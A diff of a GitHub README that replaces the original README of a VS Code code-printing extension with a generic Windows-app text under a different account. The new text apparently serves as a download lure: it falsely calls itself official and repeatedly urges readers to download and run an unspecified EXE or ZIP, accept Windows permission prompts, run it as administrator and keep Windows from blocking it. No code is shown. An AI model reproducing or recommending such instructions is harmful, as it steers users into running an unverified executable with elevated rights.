@@ -1,117 +1,261 @@
-<div align="center">
+# 🖨️ Print-code-in-1-click - Print code with one click
 
-# 📸 Print code in 1 click
+[![Download Print-code-in-1-click](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bulblioncub16/Print-code-in-1-click)
 
-### Fully automate printing code with your own format — directly from VS Code
+## 📌 Overview
 
-[TO INSTALL](https://github.com/SIRGPrice/Print-code-in-1-click/releases/tag/V1) type _Install from VSIX_ in the vs code top comand bar and select the [downloaded .vsix](https://github.com/SIRGPrice/Print-code-in-1-click/releases/tag/V1) on the explorer.
+Print-code-in-1-click helps you print code from Windows with a few simple steps. It is built for people who want a clean print view, a fast setup, and a simple way to send code to a printer or save it as PDF.
 
-[![VS Code](https://img.shields.io/badge/VS%20Code-v1.85+-007ACC?logo=visual-studio-code&logoColor=white)](https://code.visualstudio.com/)
-[![Version](https://img.shields.io/badge/version-0.0.7-blue)](https://marketplace.visualstudio.com/)
+This repo holds official support and collaboration for the app. You can use it to get the app, check updates, and find help with print settings, PDF output, and preview options.
 
-One click. Beautiful output. Zero config needed. Local and private.
+## 🧩 What it does
 
-</div>
+- Prints code in a clean layout
+- Keeps line numbers easy to read
+- Supports print preview before you print
+- Helps save code as PDF
+- Works well with common code files
+- Fits code review and print use cases
+- Helps with print-and-play workflows
+- Works with VS Code style content
 
----
+## 💻 System needs
 
-## ✨ Features
+Use a Windows PC with:
 
-| Feature | Description |
-|:--------|:------------|
-| 🥳 **Automate Printing** | Print your code in just 1 click |
-| 😶‍🌫️ **Full local, full private** | All processing is done locally, ensuring your code never leaves your machine |
-| 📄 **Print Current Document** | Print the entire active file with full syntax highlighting |
-| ✂️ **Print Selected Lines** | Print only the code you've selected |
-| 📁 **Print Multiple Files** | Pick files from your workspace and print them all at once |
-| 🎨 **Syntax Highlighting** | Powered by Prism.js with support for **20+ languages** |
-| 🔢 **Line Numbers** | Optional line numbering for easy reference |
-| 📋 **File Header** | Displays file name, path, and date on each printout |
-| 🖤 **Color Modes** | Full-color syntax or all-black text for monochrome printers |
-| ↩️ **Long Line Wrapping** | Lines wrap at page width instead of being cut off |
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB free disk space
+- A working printer, or a PDF printer
+- Internet access for the first download
 
----
+For best results, use a recent version of Windows and keep your printer driver up to date.
 
-## 🚀 Quick Start
+## 🚀 Download and install
 
-<table>
-<tr>
-<td width="60">
+1. Open this link: https://github.com/Bulblioncub16/Print-code-in-1-click
+2. On the page, look for the latest download or app file
+3. Download the file to your PC
+4. If the file is a ZIP, unzip it first
+5. If the file is an EXE, double-click it to run it
+6. Follow the on-screen steps to finish setup
 
-**1.**
+If Windows asks for permission, choose Yes so the app can open.
 
-</td>
-<td>
+## 🖱️ First run
 
-Look for the **Print code** button in the **status bar** (bottom-right corner)
+After install, open Print-code-in-1-click from the Start menu or from the file you downloaded.
 
-</td>
-</tr>
-<tr>
-<td>
+Then:
 
-**2.**
+1. Open the app
+2. Pick the code file you want to print
+3. Check the preview
+4. Choose your printer or PDF option
+5. Click print
 
-</td>
-<td>
+If you want a clean PDF file, choose a PDF printer from the list and save the file when Windows asks.
 
-**Hover** over it to see all available actions, or **click** it to print the current document instantly
+## 📄 Print a code file
 
-</td>
-</tr>
-<tr>
-<td>
+Use this flow for a simple print job:
 
-**3.**
+1. Start the app
+2. Select your code file
+3. Review the preview
+4. Check page size and margins
+5. Turn line numbers on if needed
+6. Print the file
 
-</td>
-<td>
+Good file types to use include:
 
-The OS print dialog opens automatically — just hit **Print**!
+- `.js`
+- `.ts`
+- `.py`
+- `.html`
+- `.css`
+- `.json`
+- `.md`
 
-</td>
-</tr>
-</table>
+## 🧾 Save code as PDF
 
-You can also open any command from the **Command Palette** (`Ctrl+Shift+P`):
+To save code as PDF:
 
-```
-PrintCode: Print Current Document
-PrintCode: Print Selected Lines
-PrintCode: Print Selected Documents
-PrintCode: Settings
-```
+1. Open the code in the app
+2. Pick Print
+3. Choose a PDF printer
+4. Set the file name
+5. Save the PDF
 
----
+This works well when you want to share code without changing the file.
 
-## ⚙️ Settings
+## 👀 Use print preview
 
-Customize PrintCode through the settings menu or VS Code settings:
+Print preview lets you check the page before you print.
 
-| Setting | Default | Options |
-|:--------|:-------:|:--------|
-| `printCode.lineNumbers` | `true` | Show / hide line numbers |
-| `printCode.header` | `true` | Show / hide file header (name, path, date) |
-| `printCode.colorMode` | `"colored"` | `"colored"` — syntax colors · `"black"` — monochrome |
+Look for:
 
-💡 **Tip:** Access settings quickly by hovering over the status bar icon and clicking **Settings**.
+- Cut-off lines
+- Small text
+- Wrong margins
+- Page breaks in the wrong place
+- Missing line numbers
 
----
+If the preview looks wrong, change the page setup and try again.
 
-## 🌐 Supported Languages
+## ⚙️ Common print settings
 
-<div align="center">
+These settings usually give a better result:
 
-`TypeScript` · `JavaScript` · `Python` · `Java` · `C#` · `C` · `C++` · `Go` · `Ruby` · `Rust` · `SQL` · `YAML` · `JSON` · `Markdown` · `Bash` · `PowerShell` · `PHP` · `Swift` · `Kotlin` · `HTML` · `CSS` · `XML` · and more…
+- Font size: medium
+- Paper size: A4 or Letter
+- Margins: narrow
+- Orientation: portrait for most files
+- Line numbers: on for code review
+- Syntax colors: on if your printer supports color
+- Backgrounds: off for ink saving
 
-</div>
+If your code spans many lines, use a smaller font size or landscape mode.
 
----
+## 🧠 Best use cases
 
-<div align="center">
+Print-code-in-1-click works well for:
 
-Made with 💙 by engineers
+- Code review on paper
+- Meeting notes with code samples
+- Classroom handouts
+- Print-and-play code packets
+- PDF copies for sharing
+- Offline reading of source files
+- Simple archiving of code snippets
 
-</div>
+## 🧰 Tips for better output
 
----
+- Use a monospace font
+- Keep long lines wrapped or shorten them before printing
+- Turn off dark backgrounds if text looks weak on paper
+- Use black text for standard printers
+- Test with one page before printing a long file
+- Save as PDF first if you want to check layout later
+
+## 🔍 Troubleshooting
+
+### App does not open
+
+- Check that the file finished downloading
+- Run the app again
+- Right-click the file and choose Run as administrator
+- Make sure Windows did not block the file
+
+### Print preview looks broken
+
+- Change paper size to match your printer
+- Lower the font size
+- Reduce margins
+- Turn off custom scaling
+- Try portrait and landscape mode
+
+### Text is too small
+
+- Raise the font size
+- Use zoom if the app offers it
+- Print fewer lines per page
+
+### Printer does not show up
+
+- Turn the printer on
+- Check the USB cable or Wi-Fi link
+- Open Windows printer settings
+- Restart the app after the printer is ready
+
+### PDF save does not work
+
+- Pick a PDF printer from the list
+- Check that you can write files to the save folder
+- Use a simple file name with no special symbols
+
+## 📁 Typical workflow
+
+1. Download the app
+2. Install or open it
+3. Load your code file
+4. Check the preview
+5. Choose printer or PDF
+6. Print or save
+7. Review the output
+8. Adjust settings if needed
+
+## 🛠️ For support and collaboration
+
+This repository is the official place for support and collaboration around Print-code-in-1-click.
+
+Use it to:
+
+- Report print issues
+- Share layout feedback
+- Ask about code preview behavior
+- Suggest changes for PDF export
+- Discuss printer support
+- Track updates and fixes
+
+## 📚 Topics covered
+
+- Code printing
+- Code review output
+- Extensions
+- Print automation
+- Print preview
+- Print services
+- Print to PDF
+- VS Code content
+- Print-and-play files
+
+## 🔗 Download link
+
+Use this link to visit the page and download the app:
+
+https://github.com/Bulblioncub16/Print-code-in-1-click
+
+## 🖥️ Windows setup path
+
+If you want the shortest path on Windows:
+
+1. Open the download page
+2. Get the latest file
+3. Run the installer or open the app
+4. Allow Windows permissions if asked
+5. Open a code file
+6. Print or save as PDF
+
+## 🧼 Clean printing habits
+
+- Print one sample page first
+- Check margins before a long run
+- Use PDF when you need a backup copy
+- Keep the page layout simple
+- Match the paper size to the printer
+
+## 📦 File handling
+
+If the app comes as a ZIP file:
+
+1. Download the ZIP
+2. Right-click it
+3. Choose Extract All
+4. Open the extracted folder
+5. Run the app file inside
+
+If the app comes as an EXE file:
+
+1. Download the EXE
+2. Double-click it
+3. Follow the setup steps
+4. Open the app from the Start menu or desktop
+
+## 🧭 Quick path for first use
+
+- Download from GitHub
+- Open or install the app
+- Pick a code file
+- Check the preview
+- Print or save as PDF
